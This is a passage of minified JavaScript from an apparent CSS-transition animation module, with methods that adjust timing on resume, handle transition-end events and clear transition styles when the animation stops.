      i.css(b, h);
    },
    beforeResume: function () {
      var c = this._propsData,
        b = g.merge(c),
        d = this._runTime / 1E3;
      g.each(b, function (a, b) {
        var e = d;
        a.delay >= e ? a.delay -= e : (e -= a.delay, a.delay = 0, a.duration >= e ? a.duration -= e : delete c[b]);
      });
    },
    _onTransitionEnd: function (c) {
      var c = c.originalEvent,
        b = 1,
        d = this._propsData;
      d[c.propertyName] && 1 !== d[c.propertyName].pos && (d[c.propertyName].pos = 1, g.each(d, function (a) {
        if (1 !== a.pos) return b = 0, !1;
      }), b && this.stop(!0));
    },
    doStop: function (c) {
      var b = this.node,
        d = b.style,
        a = this._propsData,
        f = [],
        e = {};
      m.detach(b, o, this._onTransitionEnd, this);
      g.each(a, function (a, d) {
        c || (e[d] = i.css(b, d));
        f.push(d);
      });
      a = g.trim(d[j].replace(RegExp("(^|,)\\s*(?:" + f.join("|") + ")\\s+[^,]+", "gi"), "$1")).replace(/^,|,,|,$/g, "") || "none";
      d[j] = a;
      i.css(b, e);
    }
  });
  return k;
});